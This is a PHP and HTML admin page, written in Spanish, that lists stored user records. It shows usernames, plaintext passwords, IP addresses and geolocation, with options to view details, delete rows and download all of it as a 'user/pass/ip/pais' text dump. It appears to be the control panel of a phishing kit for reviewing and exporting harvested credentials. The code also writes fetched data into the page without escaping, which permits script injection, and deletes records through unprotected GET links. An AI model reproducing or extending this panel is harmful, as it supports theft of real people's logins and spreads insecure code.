<?php
session_start();
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: ../login.php");
    exit;
}

$db = new PDO('sqlite:datos_almacenados.db');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Función para eliminar un usuario
if (isset($_GET['delete'])) {
    $id = $_GET['delete'];
    $stmt = $db->prepare("DELETE FROM users WHERE id = ?");
    $stmt->execute([$id]);
    header("Location: " . $_SERVER['PHP_SELF']);  // Redirecciona a la misma página para evitar reenvío del formulario
    exit;
}

// Función para descargar todos los datos en formato TXT
if (isset($_GET['download'])) {
    $result = $db->query("SELECT * FROM users");
    $txtData = "";
    foreach ($result as $row) {
        // Agregando los datos con el formato solicitado
        $txtData .= "user: " . $row['usuario'] . "\r\n";
        $txtData .= "pass: " . $row['clave'] . "\r\n";
        $txtData .= "ip: " . $row['ip'] . "\r\n";
        $txtData .= "pais: " . $row['pais'] . "\r\n";
        $txtData .= "=======================\r\n"; // Separador
    }
    file_put_contents("database_backup.txt", $txtData);
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="database_backup.txt"');
    readfile("database_backup.txt");
    exit;
}

// Mostrar todos los registros de la base de datos
$result = $db->query("SELECT * FROM users");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gestión de Usuarios</title>
    <style>
        body { font-family: Arial, sans-serif; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #f2f2f2; }
        .btn { padding: 5px 10px; text-decoration: none; color: white; background-color: #4CAF50; border: none; border-radius: 5px; cursor: pointer; }
        .btn-red { background-color: #f44336; }
        .btn-blue { background-color: #008CBA; }
        /* Modal styles */
        .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.4); }
        .modal-content { background-color: #fefefe; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 80%; }
        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; }
        .close:hover, .close:focus { color: black; text-decoration: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>Listado de Usuarios</h2>
    <table>
        <tr>
            <th>ID</th>
            <th>Usuario</th>
            <th>Clave</th>
            <th>País</th>
            <th>Acciones</th>
        </tr>
        <?php foreach ($result as $row): ?>
        <tr>
            <td><?= htmlspecialchars($row['id']) ?></td>
            <td><?= htmlspecialchars($row['usuario']) ?></td>
            <td><?= htmlspecialchars($row['clave']) ?></td>
            <td><?= htmlspecialchars($row['pais']) ?></td>
            <td>
                <a href="?delete=<?= $row['id'] ?>" class="btn btn-red">Eliminar</a>
                <button onclick="showDetails(<?= $row['id'] ?>)" class="btn btn-blue">Mostrar más</button>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>
    <form method="get"><button type="submit" name="download" class="btn">Descargar Datos</button></form>

    <!-- The Modal -->
    <div id="myModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <p id="modal-content"></p>
        </div>
    </div>

    <script>
function showDetails(id) {
    var modal = document.getElementById("myModal");
    var span = document.getElementsByClassName("close")[0];
    var content = document.getElementById("modal-content");

    fetch('details.php?id=' + id)
        .then(response => response.json())
        .then(data => {
            if (!data.error) {
                content.innerHTML = `ID: ${data.id || 'N/A'}<br>
                                     Usuario: ${data.usuario || 'N/A'}<br>
                                     Clave: ${data.clave || 'N/A'}<br>
                                     Sistema Operativo: ${data.sistema_operativo || 'N/A'}<br>
                                     Navegador: ${data.navegador || 'N/A'}<br>
                                     User-Agent: ${data.user_agent || 'N/A'}<br>
                                     IP: ${data.ip || 'N/A'}<br>
                                     País: ${data.pais || 'N/A'}<br>
                                     Región: ${data.region || 'N/A'}<br>
                                     Ciudad: ${data.ciudad || 'N/A'}<br>
                                     Timestamp: ${data.timestamp || 'N/A'}`;
                modal.style.display = "block";
            } else {
                content.innerHTML = `<p>Error: ${data.error}</p>`;
                modal.style.display = "block";
            }
        });

    span.onclick = function() {
        modal.style.display = "none";
    }

    window.onclick = function(event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }
}

    </script>
</body>
</html>